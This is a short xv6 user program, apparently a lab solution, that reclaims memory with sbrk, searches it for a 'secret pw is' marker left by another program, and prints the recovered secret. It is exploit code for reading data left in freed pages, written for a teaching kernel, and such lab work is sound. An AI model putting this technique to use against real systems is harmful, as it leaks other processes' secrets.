#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

int
main(int argc, char *argv[])
{
  // try re-allocating the pages allocated during the last run of user/secret.c
  char *end = sbrk(PGSIZE*32);

  // find the string 'secret pw is'
  // TODO: Optimize substring finding logic
  char secret_pw_is[13];
  int sz = 12;

  for (int i = 0; i < PGSIZE*32; i += 1) {
    char* substr_start = end + i;
    memcpy(secret_pw_is, substr_start, sz);
    secret_pw_is[sz] = 0;
    if (strcmp(secret_pw_is, "secret pw is") == 0) {
      const char* secret_addr = substr_start + 14;
      write(2, secret_addr, strlen(secret_addr));
      break;
    }
  }
  exit(0);
}
